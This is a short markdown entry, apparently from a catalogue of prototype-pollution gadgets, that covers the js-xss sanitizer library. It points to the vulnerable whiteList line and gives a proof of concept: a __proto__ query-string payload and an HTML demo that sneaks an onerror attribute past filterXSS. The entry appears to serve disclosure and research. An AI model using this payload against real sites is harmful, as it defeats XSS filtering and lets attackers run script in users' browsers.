## js-xss

URL: https://github.com/leizongmin/js-xss/

### JS Fingerprint
```
return (filterXSS !== 'undefined')
```

### Vulnerable code fragment
https://github.com/leizongmin/js-xss/blob/3cf0ff6f865118bb5759ae9cdead6ae949648e43/lib/xss.js#L84
```js
  options.whiteList = options.whiteList || DEFAULT.whiteList;
```

### PoC

```
?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"></script>
<script>
  Object.prototype.whiteList = {img: ['onerror', 'src']}
</script>
<script>
  document.write(filterXSS('<img src onerror=alert(1)>'))
</script>
```